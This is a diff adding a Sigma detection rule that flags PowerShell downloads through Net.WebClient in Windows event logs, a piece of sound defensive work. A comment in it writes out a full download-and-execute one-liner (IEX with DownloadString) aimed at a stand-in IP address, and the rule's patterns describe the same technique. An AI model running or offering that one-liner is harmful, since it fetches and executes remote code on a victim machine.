@@ -1,0 +1,38 @@
+title: Payload downloaded via PowerShell
+description: Detects scenarios where an attacker download a payload using PowerShell.
+references:
+- https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0002-Execution/T1059.001-PowerShell
+- https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/
+- https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters
+tags:
+- attack.execution
+- attack.t1059.001
+logsource:
+  product: windows
+  service: powershell
+detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
+  selection_powershell_native:
+    EventID: 800
+    EventData|contains: 'Net.WebClient'
+    EventData|contains:
+      - ".DownloadString("
+      - ".DownloadFile("
+
+  selection_powershell_modern:
+    EventID: 4103
+    Payload|contains: 'Net.WebClient'
+    Payload|contains:
+      - ".DownloadString("
+      - ".DownloadFile("
+
+  selection_powershell_block:
+    EventID: 4104
+    ScriptBlockText|contains: 'Net.WebClient'
+    ScriptBlockText|contains:
+      - ".DownloadString("
+      - ".DownloadFile("
+
+  condition: selection_powershell_native or selection_powershell_modern or selection_powershell_block
+falsepositives:
+- Scripts donwloading files
+level: high
